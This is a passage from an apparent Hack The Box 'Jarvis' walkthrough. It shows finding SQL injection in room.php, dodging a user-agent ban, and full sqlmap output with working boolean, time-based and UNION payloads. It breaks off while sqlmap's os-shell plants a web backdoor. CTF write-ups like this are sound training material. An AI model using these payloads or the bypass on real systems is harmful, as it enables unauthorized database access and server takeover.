class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><code>http://jarvis.htb/phpmyadmin</code><br><img src="/images/hackthebox/jarvis/6.png" alt=""></p><blockquote><p>phpMyAdmin is a free software tool written in <a href="https://php.net/" target="_blank" rel="noopener">PHP</a>, intended to handle the administration of <a href="https://www.mysql.com/" target="_blank" rel="noopener">MySQL</a> over the Web. phpMyAdmin supports a wide range of operations on MySQL and MariaDB. Frequently used operations (managing databases, tables, columns, relations, indexes, users, permissions, etc) can be performed via the user interface, while you still have the ability to directly execute any SQL statement. -<a href="https://phpmyadmin.net/" target="_blank" rel="noopener">phpmyadmin.net</a></p></blockquote><p>That can be useful later if we could find the credentials, but for now let’s concentrate on the web application.</p><h2 id="SQLi-in-room-php"><a href="#SQLi-in-room-php" class="headerlink" title="SQLi in room.php"></a>SQLi in room.php</h2><p>Back to the “Rooms &amp; Suites” section in the main page, clicking on any of these rooms requests <code>/room.php</code> with a parameter called <code>cod</code> that holds the room number:<br><img src="/images/hackthebox/jarvis/3.png" alt=""></p><p><img src="/images/hackthebox/jarvis/7.png" alt=""><br>I tried replacing the number with a single quote <code>&#39;</code> and I got a weird response:<br><img src="/images/hackthebox/jarvis/8.png" alt=""><br>So I ran <code>sqlmap</code> but I got a 404 response:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1             </span></span><br><span class="line">        ___           </span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . [)]     | .'| . |</span><br><span class="line">|___|_  [)]_|_|_|__,|  _|                 </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line">      </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no</span></span><br><span class="line"><span class="string"> liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 17:43:03 /2019-11-08/</span></span><br><span class="line"><span class="string">[17:43:03] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[17:43:04] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[17:43:04] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[17:43:05] [INFO] heuristics detected web page charset '</span><span class="keyword">ascii</span><span class="string">'</span></span><br><span class="line"><span class="string">[17:43:05] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk </span></span><br><span class="line"><span class="string">results, refer to user'</span>s <span class="keyword">manual</span> paragraph <span class="string">'Page comparison'</span></span><br><span class="line">how <span class="keyword">do</span> you want <span class="keyword">to</span> proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C</span><br><span class="line">[<span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span>] [INFO] searching <span class="keyword">for</span> dynamic <span class="keyword">content</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span>] [<span class="keyword">CRITICAL</span>] page <span class="keyword">not</span> <span class="keyword">found</span> (<span class="number">404</span>)</span><br><span class="line">[<span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span>] [<span class="keyword">WARNING</span>] <span class="keyword">HTTP</span> <span class="keyword">error</span> codes detected during run:</span><br><span class="line"><span class="number">404</span> (<span class="keyword">Not</span> <span class="keyword">Found</span>) - <span class="number">2</span> times</span><br><span class="line">[*] ending @ <span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span> /<span class="number">2019</span><span class="number">-11</span><span class="number">-08</span>/</span><br></pre></td></tr></table></figure><p>I checked the page again and saw a message indicating that I got banned for 90 seconds:<br><img src="/images/hackthebox/jarvis/9.png" alt=""><br>I assumed that it checks for the user-agent because the ban happened immediately, so I added the <code>--user-agent</code> option and used Firefox user-agent, that was enough to bypass the filter:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"     </span></span><br><span class="line">        ___           </span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . [,]     | .'| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                       </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no</span></span><br><span class="line"><span class="string"> liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[*] starting @ 22:15:42 /2019-11-08/</span></span><br><span class="line"><span class="string">[22:15:42] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[22:15:43] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[22:15:43] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[22:15:44] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[22:15:44] [INFO] testing if GET parameter '</span>cod<span class="string">' is dynamic</span></span><br><span class="line"><span class="string">[22:15:45] [INFO] GET parameter '</span>cod<span class="string">' appears to be dynamic</span></span><br><span class="line"><span class="string">[22:15:46] [INFO] heuristic (basic) test shows that GET parameter '</span>cod<span class="string">' might be injectable</span></span><br><span class="line"><span class="string">[22:15:46] [INFO] testing for SQL injection on GET parameter '</span>cod<span class="string">'</span></span><br><span class="line"><span class="string">[22:15:46] [INFO] testing '</span><span class="keyword">AND</span> <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">'</span></span><br><span class="line"><span class="string">[22:15:48] [INFO] GET parameter '</span>cod<span class="string">' appears to be '</span><span class="keyword">AND</span> <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">' injectable (with --string="of")</span></span><br><span class="line"><span class="string">[22:15:52] [INFO] heuristic (extended) test shows that the back-end DBMS could be '</span>MySQL<span class="string">'  </span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is '</span>MySQL<span class="string">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for '</span>MySQL<span class="string">' extending provided level (1) and risk (1) values? [Y/n] y    </span></span><br><span class="line"><span class="string">[22:15:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'             </span></span><br><span class="line"><span class="string">[22:15:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'                 </span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">EXP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">EXP</span>)<span class="string">'  </span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (JSON_KEYS)<span class="string">'             </span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (JSON_KEYS)<span class="string">'                     </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'        </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'  </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (EXTRACTVALUE)<span class="string">'  </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (EXTRACTVALUE)<span class="string">'      </span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (UPDATEXML)<span class="string">'    </span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (UPDATEXML)<span class="string">'         </span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">4.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">4.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:01] [INFO] testing '</span>MySQL <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:01] [INFO] testing '</span>PostgreSQL <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">'           </span></span><br><span class="line"><span class="string">[22:16:01] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">IN</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:02] [INFO] testing '</span><span class="keyword">Oracle</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">XMLType</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:02] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - <span class="keyword">PROCEDURE</span> ANALYSE (EXTRACTVALUE)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:02] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:03] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="keyword">EXP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:03] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (JSON_KEYS)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:03] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:04] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (UPDATEXML)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:04] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (EXTRACTVALUE)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:06] [INFO] testing '</span>MySQL inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:06] [INFO] testing '</span>PostgreSQL inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:06] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:07] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:08] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:08] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">query</span> <span class="keyword">SLEEP</span> - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:08] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">query</span> <span class="keyword">SLEEP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:09] [INFO] testing '</span>MySQL &lt; <span class="number">5.0</span><span class="number">.12</span> stacked queries (heavy <span class="keyword">query</span> - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:09] [INFO] testing '</span>MySQL &lt; <span class="number">5.0</span><span class="number">.12</span> stacked queries (heavy <span class="keyword">query</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span>PostgreSQL &gt; <span class="number">8.1</span> stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span><span class="keyword">Oracle</span> stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="built_in">time</span>-based blind<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:22] [INFO] GET parameter '</span>cod<span class="string">' appears to be '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="built_in">time</span>-based blind<span class="string">' injectable </span></span><br><span class="line"><span class="string">[22:16:22] [INFO] testing '</span>Generic <span class="keyword">UNION</span> <span class="keyword">query</span> (<span class="literal">NULL</span>) - <span class="number">1</span> <span class="keyword">to</span> <span class="number">20</span> <span class="keyword">columns</span><span class="string">'</span></span><br><span class="line"><span class="string">[22:16:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[22:16:22] [INFO] '</span><span class="keyword">ORDER</span> <span class="keyword">BY</span><span class="string">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection tech</span></span><br><span class="line"><span class="string">nique test</span></span><br><span class="line"><span class="string">[22:16:23] [INFO] target URL appears to have 7 columns in query</span></span><br><span class="line"><span class="string">[22:16:28] [INFO] GET parameter '</span>cod<span class="string">' is '</span>Generic <span class="keyword">UNION</span> <span class="keyword">query</span> (<span class="literal">NULL</span>) - <span class="number">1</span> <span class="keyword">to</span> <span class="number">20</span> <span class="keyword">columns</span><span class="string">' injectable</span></span><br><span class="line"><span class="string">GET parameter '</span>cod<span class="string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND 9726=9726</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND SLEEP(5)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:16:33] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 9.0 (stretch)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.25</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[22:16:33] [INFO] fetched data logged to text files under '</span>/root/.sqlmap/<span class="keyword">output</span>/jarvis.htb<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 22:16:33 /2019-11-08/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~/Desktop/HTB/boxes/jarvis#</span></span><br></pre></td></tr></table></figure><h2 id="RCE-–-gt-Shell-as-www-data"><a href="#RCE-–-gt-Shell-as-www-data" class="headerlink" title="RCE –&gt; Shell as www-data"></a>RCE –&gt; Shell as www-data</h2><p>I could get RCE in 2 different ways.</p><h3 id="First-way"><a href="#First-way" class="headerlink" title="First way:"></a>First way:</h3><p>By using the <code>os-shell</code> option in <code>sqlmap</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell                                    </span></span><br><span class="line">        ___           </span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . ["]     | .'| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                       </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no</span></span><br><span class="line"><span class="string"> liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[*] starting @ 22:23:10 /2019-11-08/</span></span><br><span class="line"><span class="string">[22:23:10] [INFO] resuming back-end DBMS '</span>mysql<span class="string">'</span></span><br><span class="line"><span class="string">[22:23:10] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND 9726=9726</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND SLEEP(5)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr                 </span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 9.0 (stretch)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.25</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">&gt; 4</span></span><br><span class="line"><span class="string">[22:23:13] [WARNING] unable to automatically retrieve the web server document root</span></span><br><span class="line"><span class="string">what do you want to use for writable directory?</span></span><br><span class="line"><span class="string">[1] common location(s) ('</span>/<span class="keyword">var</span>/www/, /<span class="keyword">var</span>/www/html, /usr/<span class="keyword">local</span>/apache2/htdocs, /<span class="keyword">var</span>/www/nginx-<span class="keyword">default</span>, /srv/www<span class="string">') (default)</span></span><br><span class="line"><span class="string">[2] custom location(s)</span></span><br><span class="line"><span class="string">[3] custom directory list file</span></span><br><span class="line"><span class="string">[4] brute force search</span></span><br><span class="line"><span class="string">&gt; 2</span></span><br><span class="line"><span class="string">please provide a comma separate list of absolute directory paths: /var/www/html</span></span><br><span class="line"><span class="string">[22:23:40] [INFO] retrieved web server absolute paths: '</span>/images/<span 